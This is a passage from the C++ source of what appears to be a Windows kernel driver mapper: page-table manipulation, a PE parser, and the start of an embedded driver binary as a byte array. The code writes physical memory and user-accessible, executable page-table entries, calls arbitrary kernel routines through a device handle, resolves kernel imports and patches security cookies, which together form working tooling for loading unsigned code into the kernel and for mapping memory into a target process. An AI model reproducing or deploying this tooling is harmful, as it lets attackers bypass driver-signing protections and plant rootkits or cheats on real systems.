      // setup regular PDE and PTE
      PDE_64 pde = {0};
      if (!read_physical_address(device_handle,
                                 PFN_TO_PAGE(pdpte.PageFrameNumber) +
                                     helper.AsIndex.Pd * sizeof(PDE_64),
                                 &pde, sizeof(PDE_64))) {
        return false;
      }

      if (!pde.Present) {
        auto pt_va = g_memory_manager->allocate_independent_pages(device_handle, 0x1000);
        if (!pt_va) {
          return false;
        }

        // clear PT
        if (kernel_RtlZeroMemory) {
          g_memory_manager->call_kernel_function<void>(device_handle, nullptr, kernel_RtlZeroMemory,
                                                       0x1000);
        }

        std::uint64_t pt_pfn = get_page_frame_number(device_handle, pt_va, false);
        if (!pt_pfn) {
          return false;
        }

        pde.Flags = 0;
        pde.Present = 1;
        pde.Write = 1;
        pde.Supervisor = 0;
        pde.Accessed = 1;
        pde.ExecuteDisable = 0;
        pde.PageFrameNumber = pt_pfn;

        if (!write_physical_address(device_handle,
                                    PFN_TO_PAGE(pdpte.PageFrameNumber) +
                                        helper.AsIndex.Pd * sizeof(PDE_64),
                                    &pde, sizeof(PDE_64))) {
          return false;
        }

        // flush caches after PDE modification
        flush_caches(device_handle, reinterpret_cast<void*>(current_va));
      }

      // setup PTE
      PTE_64 pte = {0};
      pte.Present = 1;
      pte.Write = 1;
      pte.Global = 0;
      pte.Accessed = 1;
      pte.Supervisor = 0;
      pte.ExecuteDisable = 0;
      pte.PageFrameNumber = page_frame_number;

      if (!write_physical_address(
              device_handle, PFN_TO_PAGE(pde.PageFrameNumber) + helper.AsIndex.Pt * sizeof(PTE_64),
              &pte, sizeof(PTE_64))) {
        return false;
      }

      // flush caches after PTE modification
      flush_caches(device_handle, reinterpret_cast<void*>(current_va));
    }
  }

  // flush caches
  return page_table_manager_t::flush_caches(device_handle, reinterpret_cast<void*>(base_va));
}
auto page_table_manager_t::flush_caches(HANDLE device_handle, void* address) -> bool {
  if (!device_handle) {
    return false;
  }

  // get kernel function addresses
  static std::uint64_t kernel_ke_flush_entire_tb = 0;
  static std::uint64_t kernel_ke_invalidate_all_caches = 0;
  static std::uint64_t kernel_ke_flush_single_tb = 0;

  // get exported functions from ntoskrnl
  if (!kernel_ke_flush_entire_tb) {
    kernel_ke_flush_entire_tb = g_utils->get_kernel_module_export(
        device_handle, g_driver_mapper->get_ntoskrnl_base(), "KeFlushEntireTb");
    if (!kernel_ke_flush_entire_tb) {
      mapper_log("ERROR", "failed to get KeFlushEntireTb export");
      return false;
    }
  }

  if (!kernel_ke_invalidate_all_caches) {
    kernel_ke_invalidate_all_caches = g_utils->get_kernel_module_export(
        device_handle, g_driver_mapper->get_ntoskrnl_base(), "KeInvalidateAllCaches");
    if (!kernel_ke_invalidate_all_caches) {
      mapper_log("ERROR", "failed to get KeInvalidateAllCaches export");
      return false;
    }
  }

  // get KeFlushSingleTb from PDB offsets
  if (!kernel_ke_flush_single_tb) {
    kernel_ke_flush_single_tb = g_driver_mapper->get_pdb_offsets().KeFlushSingleTb;
    if (!kernel_ke_flush_single_tb) {
      mapper_log("ERROR", "failed to get KeFlushSingleTb address from PDB");
      return false;
    }
  }

  // call KeFlushEntireTb(TRUE, TRUE) - flushes CR3/CR4 on all cores
  if (!g_memory_manager->call_kernel_function<void>(device_handle, nullptr,
                                                    kernel_ke_flush_entire_tb,
                                                    TRUE,     // FlushCurrentTb
                                                    TRUE)) {  // FlushGlobalTb
    mapper_log("ERROR", "failed to flush entire TLB");
    return false;
  }

  // call KeInvalidateAllCaches() - executes WBINVD on all cores
  if (!g_memory_manager->call_kernel_function<void>(device_handle, nullptr,
                                                    kernel_ke_invalidate_all_caches)) {
    mapper_log("ERROR", "failed to invalidate all caches");
    return false;
  }

  if (address) {
    // call KeFlushSingleTb(address, 0, 1) - executes INVLPG on all cores
    if (!g_memory_manager->call_kernel_function<void>(
            device_handle, nullptr, kernel_ke_flush_single_tb,
            reinterpret_cast<std::uintptr_t>(address), 0, 1)) {
      mapper_log("ERROR", "failed to flush single TLB entry");
      return false;
    }
  }

  return true;
}

auto page_table_manager_t::get_pml4e(std::uint32_t pml4_idx) -> std::uint64_t {
  return static_cast<std::uint64_t>(pml4_idx) << 39;
}

auto page_table_manager_t::get_pdpt(std::uint32_t pdpt_idx) -> std::uint64_t {
  return static_cast<std::uint64_t>(pdpt_idx) << 30;
}

auto page_table_manager_t::get_pd(std::uint32_t pd_idx) -> std::uint64_t {
  return static_cast<std::uint64_t>(pd_idx) << 21;
}

auto page_table_manager_t::get_pt(std::uint32_t pt_idx) -> std::uint64_t {
  return static_cast<std::uint64_t>(pt_idx) << 12;
}

auto page_table_manager_t::physical_to_virtual(HANDLE device_handle, std::uint64_t physical_address)
    -> std::uint64_t {
  // get MmGetVirtualForPhysical export
  static std::uint64_t kernel_MmGetVirtualForPhysical = 0;
  if (!kernel_MmGetVirtualForPhysical) {
    kernel_MmGetVirtualForPhysical = g_utils->get_kernel_module_export(
        device_handle, g_utils->get_kernel_module_address("ntoskrnl.exe"),
        "MmGetVirtualForPhysical");
    if (!kernel_MmGetVirtualForPhysical) {
      return 0;
    }
  }

  PHYSICAL_ADDRESS phys_addr;
  phys_addr.QuadPart = physical_address;

  std::uint64_t virtual_address = 0;
  if (!g_memory_manager->call_kernel_function(device_handle, &virtual_address,
                                              kernel_MmGetVirtualForPhysical, phys_addr)) {
    return 0;
  }

  return virtual_address;
}

// helper to get PDE address
auto page_table_manager_t::get_pde_address(HANDLE device_handle, std::uint64_t virtual_address)
    -> std::uint64_t {
  const auto mi_get_pde_address = g_driver_mapper->get_pdb_offsets().MiGetPdeAddress;
  if (g_driver_mapper->get_pdb_offsets().MiGetPdeAddress) {
    std::uint64_t pde_address = 0;
    if (g_memory_manager->call_kernel_function(device_handle, &pde_address,
                                               g_driver_mapper->get_pdb_offsets().MiGetPdeAddress,
                                               virtual_address)) {
      return pde_address;
    }
  }

  return 0;
}

// helper to get PTE address
auto page_table_manager_t::get_pte_address(HANDLE device_handle, std::uint64_t virtual_address)
    -> std::uint64_t {
  const auto mi_get_pte_address = g_driver_mapper->get_pdb_offsets().MiGetPteAddress;
  if (mi_get_pte_address) {
    std::uint64_t pte_address = 0;
    if (g_memory_manager->call_kernel_function(device_handle, &pte_address, mi_get_pte_address,
                                               virtual_address)) {
      return pte_address;
    }
  }

  return 0;
}
```

`client/driver_mapper/page_table_manager.hpp`:

```hpp
#pragma once

#include <Windows.h>
#include <cstdint>
#include <vector>
#include "memory_manager.hpp"
#include "utils.hpp"

#include "lib/ia_32.h"

#define NtCurrentProcess ((HANDLE)(LONG_PTR)-1)

// status codes
#define STATUS_SUCCESS 0x00000000
#define STATUS_UNSUCCESSFUL 0xC0000001
#define STATUS_INVALID_PARAMETER 0xC000000D
#define STATUS_NO_MEMORY 0xC0000017
#define STATUS_INVALID_ADDRESS 0xC0000141
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

// physical address conversion
#define PFN_TO_PAGE(pfn) ((pfn) << 12)
#define PAGE_TO_PFN(physical_address) ((physical_address) >> 12)

// page protection constants
#define PAGE_EXECUTE_READWRITE 0x40

typedef union _PHYSICAL_ADDRESS {
  struct {
    ULONG LowPart;
    LONG HighPart;
  };
  LONGLONG QuadPart;
} PHYSICAL_ADDRESS, *PPHYSICAL_ADDRESS;

class page_table_manager_t {
public:
  page_table_manager_t() = default;
  ~page_table_manager_t() = default;

  // Advanced allocation methods
  auto allocate_within_current_process_context(HANDLE device_handle, std::uint32_t target_pid,
                                               std::size_t size, bool use_large_page,
                                               bool use_high_address = true) -> void*;

  // Page table manipulation
  auto write_page_tables(HANDLE device_handle, std::uint64_t target_dir_base, std::uint64_t base_va,
                         std::size_t page_count, bool use_large_page) -> bool;

  // Physical memory operations
  auto physical_to_virtual(HANDLE device_handle, std::uintptr_t physical_address) -> std::uintptr_t;
  auto virtual_to_physical(HANDLE device_handle, std::uintptr_t virtual_address) -> std::uintptr_t;
  auto read_physical_address(HANDLE device_handle, std::uintptr_t physical_address, void* buffer,
                             std::size_t size) -> bool;
  auto write_physical_address(HANDLE device_handle, std::uintptr_t physical_address, void* buffer,
                              std::size_t size) -> bool;

  // Cache and TLB management'
  auto flush_caches(HANDLE device_handle, void* address) -> bool;

  auto get_pml4e(std::uint32_t pml4_idx) -> std::uint64_t;

  auto get_pdpt(std::uint32_t pdpt_idx) -> std::uint64_t;

  auto get_pd(std::uint32_t pd_idx) -> std::uint64_t;

  auto get_pt(std::uint32_t pt_idx) -> std::uint64_t;
  auto get_pde_address(HANDLE device_handle, std::uint64_t virtual_address) -> std::uint64_t;
  auto get_pte_address(HANDLE device_handle, std::uint64_t virtual_address) -> std::uint64_t;

private:
  // Helper functions
  auto allocate_page_table_page(HANDLE device_handle) -> std::uintptr_t;
  auto get_page_frame_number(HANDLE device_handle, std::uint64_t virtual_address,
                             bool use_large_page) -> std::uint64_t;
  auto setup_page_table_entry(HANDLE device_handle, std::uintptr_t entry_address, std::uint64_t pfn,
                              bool is_present, bool is_writable, bool is_executable) -> bool;

  // Constants
  static constexpr size_t page_size_4kb = 0x1000;
  static constexpr size_t large_page_size = 0x200000;
  static constexpr auto pml4_shift = 39;
  static constexpr auto pdpt_shift = 30;
  static constexpr auto pd_shift = 21;
  static constexpr auto pt_shift = 12;
};

// Global instance
inline std::unique_ptr<page_table_manager_t> g_page_table_manager =
    std::make_unique<page_table_manager_t>();
```

`client/driver_mapper/pe_parser.cpp`:

```cpp
#include "pe_parser.hpp"
#include "memory_manager.hpp"
#include <iostream>

auto pe_parser_t::validate_dos_header(const void* buffer, std::size_t buffer_size) -> bool {
  if (!buffer || buffer_size < sizeof(IMAGE_DOS_HEADER)) {
    return false;
  }

  const auto dos_header = static_cast<const IMAGE_DOS_HEADER*>(buffer);
  return dos_header->e_magic == IMAGE_DOS_SIGNATURE;
}

auto pe_parser_t::validate_nt_headers(const void* buffer, std::size_t buffer_size) -> bool {
  if (!validate_dos_header(buffer, buffer_size)) {
    return false;
  }

  const auto dos_header = static_cast<const IMAGE_DOS_HEADER*>(buffer);
  if (dos_header->e_lfanew >= buffer_size || dos_header->e_lfanew < 0 ||
      buffer_size < dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS64)) {
    return false;
  }

  const auto nt_headers = reinterpret_cast<const IMAGE_NT_HEADERS64*>(
      static_cast<const char*>(buffer) + dos_header->e_lfanew);

  return nt_headers->Signature == IMAGE_NT_SIGNATURE;
}

auto pe_parser_t::get_nt_headers(void* buffer) -> PIMAGE_NT_HEADERS64 {
  if (!buffer || !validate_dos_header(buffer, SIZE_MAX)) {
    return nullptr;
  }

  const auto dos_header = static_cast<PIMAGE_DOS_HEADER>(buffer);
  return reinterpret_cast<PIMAGE_NT_HEADERS64>(static_cast<char*>(buffer) + dos_header->e_lfanew);
}

auto pe_parser_t::get_imports(void* buffer) -> std::vector<import_info_t> {
  std::vector<import_info_t> imports;

  auto nt_headers = get_nt_headers(buffer);
  if (!nt_headers) {
    return imports;
  }

  const auto import_dir = &nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
  if (!import_dir->VirtualAddress) {
    return imports;
  }

  auto import_desc = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(static_cast<char*>(buffer) +
                                                                import_dir->VirtualAddress);

  while (import_desc->Name) {
    import_info_t import_info;
    import_info.module_name =
        reinterpret_cast<char*>(static_cast<char*>(buffer) + import_desc->Name);

    auto thunk =
        reinterpret_cast<PIMAGE_THUNK_DATA64>(static_cast<char*>(buffer) + import_desc->FirstThunk);
    auto orig_thunk = reinterpret_cast<PIMAGE_THUNK_DATA64>(static_cast<char*>(buffer) +
                                                            import_desc->OriginalFirstThunk);

    while (orig_thunk->u1.Function) {
      import_function_t func_info;

      if (!(orig_thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64)) {
        auto import_by_name = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(static_cast<char*>(buffer) +
                                                                      orig_thunk->u1.AddressOfData);
        func_info.name = import_by_name->Name;
      }

      func_info.address = &thunk->u1.Function;
      import_info.functions.push_back(func_info);

      ++thunk;
      ++orig_thunk;
    }

    imports.push_back(import_info);
    ++import_desc;
  }

  return imports;
}

auto pe_parser_t::get_relocs(void* image_base) -> std::vector<reloc_info_t> {
  std::vector<reloc_info_t> relocs;

  auto nt_headers = get_nt_headers(image_base);
  if (!nt_headers) {
    return relocs;
  }

  auto reloc_va =
      nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
  if (!reloc_va) {
    return relocs;
  }

  auto current_base_relocation = reinterpret_cast<PIMAGE_BASE_RELOCATION>(
      reinterpret_cast<std::uint64_t>(image_base) + reloc_va);
  auto reloc_end = reinterpret_cast<PIMAGE_BASE_RELOCATION>(
      reinterpret_cast<std::uint64_t>(current_base_relocation) +
      nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size);

  while (current_base_relocation < reloc_end && current_base_relocation->SizeOfBlock) {
    reloc_info_t reloc_info;

    reloc_info.address =
        reinterpret_cast<std::uint64_t>(image_base) + current_base_relocation->VirtualAddress;
    reloc_info.item = reinterpret_cast<std::uint16_t*>(
        reinterpret_cast<std::uint64_t>(current_base_relocation) + sizeof(IMAGE_BASE_RELOCATION));
    reloc_info.count = (current_base_relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) /
                       sizeof(std::uint16_t);

    relocs.push_back(reloc_info);

    current_base_relocation = reinterpret_cast<PIMAGE_BASE_RELOCATION>(
        reinterpret_cast<std::uint64_t>(current_base_relocation) +
        current_base_relocation->SizeOfBlock);
  }

  return relocs;
}

auto pe_parser_t::relocate_image_by_delta(void* image_base, std::uint64_t delta) -> bool {
  auto relocs = get_relocs(image_base);

  for (const auto& current_reloc : relocs) {
    for (auto i = 0u; i < current_reloc.count; ++i) {
      auto type = current_reloc.item[i] >> 12;
      auto offset = current_reloc.item[i] & 0xFFF;

      if (type == IMAGE_REL_BASED_DIR64) {
        auto reloc_address = reinterpret_cast<std::uint64_t*>(current_reloc.address + offset);
        *reloc_address += delta;
      }
    }
  }

  return true;
}

auto pe_parser_t::process_imports(void* buffer, import_resolver_t resolver) -> bool {
  if (!buffer || !resolver) {
    return false;
  }

  auto imports = get_imports(buffer);

  for (const auto& import : imports) {
    for (const auto& func : import.functions) {
      auto resolved_addr = resolver(import.module_name, func.name);
      if (!resolved_addr) {
        mapper_log("ERROR", "failed to resolve: %ws::%ws",
                   std::wstring(import.module_name.begin(), import.module_name.end()).c_str(),
                   std::wstring(func.name.begin(), func.name.end()).c_str());
        return false;
      }

      *func.address = resolved_addr;
    }
  }

  return true;
}

auto pe_parser_t::resolve_imports(void* image_base, HANDLE device_handle,
                                  std::uint64_t ntoskrnl_addr) -> bool {
  auto imports = get_imports(image_base);
  for (const auto& current_import : imports) {
    // Use g_utils to get kernel module address
    std::uint64_t module_base = g_utils->get_kernel_module_address(current_import.module_name);
    if (!module_base) {
      mapper_log("ERROR", "dependency %ws wasn't found",
                 std::wstring(current_import.module_name.begin(), current_import.module_name.end())
                     .c_str());
      return false;
    }
    for (const auto& function_data : current_import.functions) {
      // get kernel module export - now passes device_handle and module_base as uint64_t
      std::uint64_t function_address =
          get_module_export(device_handle, module_base, function_data.name);
      if (!function_address) {
        // try with ntoskrnl
        if (module_base != ntoskrnl_addr) {
          function_address = get_module_export(device_handle, ntoskrnl_addr, function_data.name);
        }
        if (!function_address) {
          mapper_log("ERROR", "failed to resolve import %ws ",
                     std::wstring(function_data.name.begin(), function_data.name.end()).c_str());
          return false;
        }
      }
      *function_data.address = function_address;
    }
  }
  return true;
}

auto pe_parser_t::find_section(void* image_base, const std::string& section_name)
    -> PIMAGE_SECTION_HEADER {
  auto nt_headers = get_nt_headers(image_base);
  if (!nt_headers) {
    return nullptr;
  }

  auto section_header = IMAGE_FIRST_SECTION(nt_headers);

  for (auto i = 0u; i < nt_headers->FileHeader.NumberOfSections; ++i) {
    std::string current_section_name(
        reinterpret_cast<char*>(section_header[i].Name),
        strnlen(reinterpret_cast<char*>(section_header[i].Name), IMAGE_SIZEOF_SHORT_NAME));

    if (current_section_name == section_name) {
      return &section_header[i];
    }
  }

  return nullptr;
}

std::uint64_t pe_parser_t::get_module_export(HANDLE device_handle, std::uint64_t module_base,
                                             const std::string& export_name) {
  // Read DOS header first
  IMAGE_DOS_HEADER dos_header;
  if (!g_memory_manager->read_memory(device_handle, module_base, &dos_header, sizeof(dos_header))) {
    return 0;
  }

  if (dos_header.e_magic != IMAGE_DOS_SIGNATURE) {
    return 0;
  }

  // read NT headers
  IMAGE_NT_HEADERS64 nt_headers;
  if (!g_memory_manager->read_memory(device_handle, module_base + dos_header.e_lfanew, &nt_headers,
                                     sizeof(nt_headers))) {
    return 0;
  }

  if (nt_headers.Signature != IMAGE_NT_SIGNATURE) {
    return 0;
  }

  auto export_va =
      nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
  if (!export_va) {
    return 0;
  }

  // read export directory
  IMAGE_EXPORT_DIRECTORY export_dir;
  if (!g_memory_manager->read_memory(device_handle, module_base + export_va, &export_dir,
                                     sizeof(export_dir))) {
    return 0;
  }

  // read function addresses array
  auto functions_size = export_dir.NumberOfFunctions * sizeof(DWORD);
  auto functions = std::make_unique<DWORD[]>(export_dir.NumberOfFunctions);
  if (!g_memory_manager->read_memory(device_handle, module_base + export_dir.AddressOfFunctions,
                                     functions.get(), functions_size)) {
    return 0;
  }

  // read names array
  auto names_size = export_dir.NumberOfNames * sizeof(DWORD);
  auto names = std::make_unique<DWORD[]>(export_dir.NumberOfNames);
  if (!g_memory_manager->read_memory(device_handle, module_base + export_dir.AddressOfNames,
                                     names.get(), names_size)) {
    return 0;
  }

  // read ordinals array
  auto ordinals_size = export_dir.NumberOfNames * sizeof(WORD);
  auto ordinals = std::make_unique<WORD[]>(export_dir.NumberOfNames);
  if (!g_memory_manager->read_memory(device_handle, module_base + export_dir.AddressOfNameOrdinals,
                                     ordinals.get(), ordinals_size)) {
    return 0;
  }

  // search for the function
  for (DWORD i = 0; i < export_dir.NumberOfNames; ++i) {
    // read function name
    char name_buffer[256];
    if (!g_memory_manager->read_memory(device_handle, module_base + names[i], name_buffer,
                                       sizeof(name_buffer))) {
      continue;
    }
    name_buffer[255] = '\0';  // ensure null termination

    if (export_name == name_buffer) {
      auto ordinal = ordinals[i];
      if (ordinal < export_dir.NumberOfFunctions) {
        auto function_rva = functions[ordinal];
        if (function_rva) {
          return module_base + function_rva;
        }
      }
    }
  }

  return 0;
}

auto pe_parser_t::is_valid_pe(void* buffer) -> bool {
  if (!buffer) {
    return false;
  }

  // check DOS header
  auto dos_header = static_cast<PIMAGE_DOS_HEADER>(buffer);
  if (dos_header->e_magic != IMAGE_DOS_SIGNATURE) {
    return false;
  }

  // check NT headers
  auto nt_headers =
      reinterpret_cast<PIMAGE_NT_HEADERS64>(static_cast<char*>(buffer) + dos_header->e_lfanew);

  if (nt_headers->Signature != IMAGE_NT_SIGNATURE) {
    return false;
  }

  // check if it's 64-bit
  if (nt_headers->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
    return false;
  }

  return true;
}

auto pe_parser_t::fix_security_cookie(void* image_base, std::uint64_t kernel_image_base) -> bool {
  auto nt_headers = get_nt_headers(image_base);
  if (!nt_headers) {
    return false;
  }

  auto load_config_directory =
      nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress;
  if (!load_config_directory) {
    // no load config directory - cookie not defined
    return true;
  }

  auto load_config_struct = reinterpret_cast<PIMAGE_LOAD_CONFIG_DIRECTORY>(
      static_cast<char*>(image_base) + load_config_directory);

  auto stack_cookie = load_config_struct->SecurityCookie;
  if (!stack_cookie) {
    // cookie not defined, this is OK
    return true;
  }

  // calc the stack cookie address in local image
  stack_cookie = stack_cookie - kernel_image_base + reinterpret_cast<std::uintptr_t>(image_base);

  auto cookie_ptr = reinterpret_cast<std::uintptr_t*>(stack_cookie);

  // check if cookie needs fixing (default value is 0x2B992DDFA232)
  if (*cookie_ptr != 0x2B992DDFA232) {
    // cookie already fixed
    return true;
  }

  // generate new cookie value
  auto new_cookie = static_cast<std::uintptr_t>(0x2B992DDFA232) ^
                    g_utils->get_current_process_id() ^ g_utils->get_current_thread_id();

  // ensure cookie is not the default value
  if (new_cookie == 0x2B992DDFA232) {
    new_cookie = 0x2B992DDFA233;
  }

  // set the new cookie
  *cookie_ptr = new_cookie;

  return true;
}
```

`client/driver_mapper/pe_parser.hpp`:

```hpp
#pragma once
#include <Windows.h>
#include <vector>
#include <string>
#include <functional>
#include <cstdint>
#include "utils.hpp"

class pe_parser_t {
public:
  pe_parser_t() = default;
  ~pe_parser_t() = default;

  // Structure definitions
  struct import_function_t {
    std::string name;
    std::uint64_t* address;
  };

  struct import_info_t {
    std::string module_name;
    std::vector<import_function_t> functions;

    // compatibility alias
    const std::vector<import_function_t>& function_datas() const {
      return functions;
    }
    std::vector<import_function_t>& function_datas() {
      return functions;
    }
  };

  struct reloc_info_t {
    std::uint64_t address;
    std::uint16_t* item;
    std::uint32_t count;
  };

  // function pointer type for import resolution
  using import_resolver_t = std::function<std::uint64_t(const std::string& module_name,
                                                        const std::string& function_name)>;

  // func declarations
  auto validate_dos_header(const void* buffer, std::size_t buffer_size) -> bool;
  auto validate_nt_headers(const void* buffer, std::size_t buffer_size) -> bool;
  auto get_nt_headers(void* buffer) -> PIMAGE_NT_HEADERS64;
  auto get_imports(void* buffer) -> std::vector<import_info_t>;
  auto get_relocs(void* image_base) -> std::vector<reloc_info_t>;
  auto relocate_image_by_delta(void* image_base, std::uint64_t delta) -> bool;
  auto process_imports(void* buffer, import_resolver_t resolver) -> bool;
  auto resolve_imports(void* image_base, HANDLE device_handle, std::uint64_t ntoskrnl_addr) -> bool;
  auto find_section(void* image_base, const std::string& section_name) -> PIMAGE_SECTION_HEADER;
  auto get_module_export(HANDLE device_handle, std::uint64_t module_base,
                         const std::string& export_name) -> std::uint64_t;
  auto is_valid_pe(void* buffer) -> bool;
  auto fix_security_cookie(void* image_base, std::uint64_t kernel_image_base) -> bool;
};

// global pe parser instance
inline std::unique_ptr<pe_parser_t> g_pe_parser = std::make_unique<pe_parser_t>();
```

`client/driver_mapper/service_manager.cpp`:

```cpp
#include "service_manager.hpp"
#include "utils.hpp"
#include "memory_manager.hpp"
#include <random>
#include <fstream>
#include <iostream>
#pragma once
#include <stdint.h>

const unsigned char service_manager_t::driver_resource_[] = {
    0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00,
    0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD8, 0x00, 0x00, 0x00,
    0x0E, 0x1F, 0xBA, 0x0E, 0x00, 0xB4, 0x09, 0xCD, 0x21, 0xB8, 0x01, 0x4C, 0xCD, 0x21, 0x54, 0x68,
    0x69, 0x73, 0x20, 0x70, 0x72, 0x6F, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F,
    0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6E, 0x20, 0x69, 0x6E, 0x20, 0x44, 0x4F, 0x53, 0x20,
    0x6D, 0x6F, 0x64, 0x65, 0x2E, 0x0D, 0x0D, 0x0A, 0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x47, 0x85, 0xC5, 0x87, 0x03, 0xE4, 0xAB, 0xD4, 0x03, 0xE4, 0xAB, 0xD4, 0x03, 0xE4, 0xAB, 0xD4,
    0x03, 0xE4, 0xAA, 0xD4, 0x24, 0xE4, 0xAB, 0xD4, 0x75, 0x79, 0xD0, 0xD4, 0x06, 0xE4, 0xAB, 0xD4,
    0x75, 0x79, 0xD6, 0xD4, 0x00, 0xE4, 0xAB, 0xD4, 0x75, 0x79, 0xC6, 0xD4, 0x04, 0xE4, 0xAB, 0xD4,
    0xC0, 0xEB, 0xF5, 0xD4, 0x02, 0xE4, 0xAB, 0xD4, 0x75, 0x79, 0xD3, 0xD4, 0x02, 0xE4, 0xAB, 0xD4,
    0x52, 0x69, 0x63, 0x68, 0x03, 0xE4, 0xAB, 0xD4, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x45, 0x00, 0x00, 0x64, 0x86, 0x06, 0x00,
    0xC3, 0xEA, 0x84, 0x52, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF0, 0x00, 0x22, 0x00,
    0x0B, 0x02, 0x08, 0x00, 0x00, 0x50, 0x00, 0x00, 0x00, 0xB2, 0x5C, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x22, 0x5D, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x10, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x05, 0x00, 0x02, 0x00, 0x05, 0x00, 0x02, 0x00,
    0x05, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x5D, 0x00, 0x00, 0x04, 0x00, 0x00,
    0x2A, 0x32, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xDC, 0x22, 0x5D, 0x00, 0x3C, 0x00, 0x00, 0x00,
    0x00, 0x30, 0x5D, 0x00, 0xF8, 0x03, 0x00, 0x00, 0x00, 0x10, 0x5D, 0x00, 0x08, 0x04, 0x00, 0x00,
    0x00, 0x68, 0x00, 0x00, 0x08, 0x1F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x50, 0x61, 0x00, 0x00, 0x1C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x60, 0x00, 0x00, 0x48, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x2E, 0x74, 0x65, 0x78, 0x74, 0x00, 0x00, 0x00, 0x15, 0x46, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
    0x00, 0x48, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x68, 0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00,
    0xC0, 0x07, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x4C, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x48,
    0x2E, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0xC0, 0x9E, 0x5C, 0x00, 0x00, 0x70, 0x00, 0x00,
    0x00, 0x02, 0x00, 0x00, 0x00, 0x54, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0xC8, 0x2E, 0x70, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00,
    0x08, 0x04, 0x00, 0x00, 0x00, 0x10, 0x5D, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x56, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x48,
    0x49, 0x4E, 0x49, 0x54, 0x00, 0x00, 0x00, 0x00, 0xA8, 0x07, 0x00, 0x00, 0x00, 0x20, 0x5D, 0x00,
    0x00, 0x08, 0x00, 0x00, 0x00, 0x5C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
